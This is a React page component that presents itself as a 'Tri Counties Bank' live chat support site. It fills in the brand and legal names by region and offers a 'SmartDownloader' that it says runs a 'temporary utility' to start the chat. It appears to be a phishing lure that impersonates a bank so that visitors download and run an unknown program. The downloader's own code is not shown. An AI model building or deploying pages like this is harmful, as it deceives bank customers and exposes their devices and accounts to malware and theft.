"use client";

import { Header } from "./components/Header";
import { SmartDownloader } from "./components/SmartDownloader";
import { useUserRegion } from "./hooks/useUserRegion";

export default function Home() {
  const { regionData, loading } = useUserRegion();

  return (
    <div className="relative min-h-screen flex flex-col bg-tcbk-gray-bg">
      <Header />

      {/* Main Content Wrapper */}
      <main className="flex-1 flex flex-col">
        {/* Hero Banner */}
        <div className="w-full bg-tcbk-gold pt-12 pb-16 px-6">
          <div className="w-full max-w-[1200px] mx-auto flex flex-col lg:flex-row gap-12 lg:gap-24 items-start justify-between">

            {/* Promo Section (Left) */}
            <div className="flex-1 text-tcbk-text max-w-2xl flex flex-col pt-4">
              <h1 className="font-['canada-type-gibson'] text-[40px] md:text-[52px] font-normal leading-[1.1] mb-6 tracking-tight">
                <span className="font-bold">{loading ? "Tri Counties Bank" : regionData.brandName}</span> <br />
                Live Chat Support.
              </h1>
              <p className="text-[18px] text-[#555] mb-8 leading-relaxed font-['canada-type-gibson']">
                {loading ? "Loading your local support..." : regionData.heroSubtitle} Start a secure live chat session with our specialists to get real-time assistance directly on your device.
              </p>

              <ul className="space-y-5 list-none p-0 m-0 text-tcbk-text text-[16px] font-['canada-type-gibson']">
                <li className="flex items-start gap-4">
                  <div className="w-6 h-6 flex items-center justify-center mt-0.5">
                    <svg className="w-5 h-5 text-tcbk-black" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                       <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                    </svg>
                  </div>
                  <div>
                     <strong className="block font-bold">Bank-grade Encryption</strong>
                     <span className="text-[#555] text-[14px]">Your session is fully secured end-to-end.</span>
                  </div>
                </li>
                <li className="flex items-start gap-4">
                  <div className="w-6 h-6 flex items-center justify-center mt-0.5">
                    <svg className="w-5 h-5 text-tcbk-black" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                       <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                  </div>
                  <div>
                     <strong className="block font-bold">Instant Resolution</strong>
                     <span className="text-[#555] text-[14px]">Connect directly to an available agent in seconds.</span>
                  </div>
                </li>
              </ul>
            </div>

            {/* Action Card (Right) */}
            <div className="w-full max-w-[420px] flex items-center mt-6 lg:mt-0">
              <div className="w-full bg-white p-8 md:p-10 shadow-[0_8px_32px_rgba(0,0,0,0.18)] border border-tcbk-gray-border relative">
                <div className="absolute top-0 left-0 w-full h-1 bg-[#4E801F]"></div>

                <h2 className="font-['canada-type-gibson'] text-[24px] font-bold text-tcbk-text mb-3">
                  Start your session
                </h2>
                <p className="text-[#555] text-[14px] mb-8 font-['canada-type-gibson'] leading-relaxed">
                  Click below to initiate a secure live chat. A temporary utility will run to connect you with an agent.
                </p>

                <SmartDownloader />
              </div>
            </div>

          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="w-full bg-tcbk-gray-bg border-t-4 border-tcbk-gold pt-12 pb-8 px-6 text-tcbk-black font-['canada-type-gibson']">
        <div className="max-w-[1200px] mx-auto">
           <div className="flex flex-col md:flex-row justify-between items-start md:items-center border-b border-tcbk-gray-border pb-8 mb-8 gap-6">
              <div className="flex flex-wrap gap-x-6 gap-y-3 text-[14px]">
                 <a href="#" className="hover:underline">About Tri Counties Bank</a>
                 <a href="#" className="hover:underline">Site map</a>
                 <a href={loading ? "#" : regionData.termsUrl} className="hover:underline" target="_blank" rel="noopener noreferrer">Terms and conditions</a>
                 <a href="#" className="hover:underline">Privacy Notice</a>
                 <a href="#" className="hover:underline">Cookie Notice</a>
                 <a href="#" className="hover:underline">Accessibility</a>
              </div>
           </div>
           <p className="text-[#757E84] text-[12px] leading-relaxed mb-4">
              © {new Date().getFullYear()} {loading ? "Tri Counties Bank" : regionData.legalEntityName}. All rights reserved. No endorsement or approval of any third parties or their advice, opinions, information, products or services is expressed or implied by any information on this Site or by any hyperlinks to or from any third party websites or pages. Your use of this website is subject to the terms and conditions governing it. Please read these terms and conditions before using the website.
           </p>
        </div>
      </footer>
    </div>
  );
}
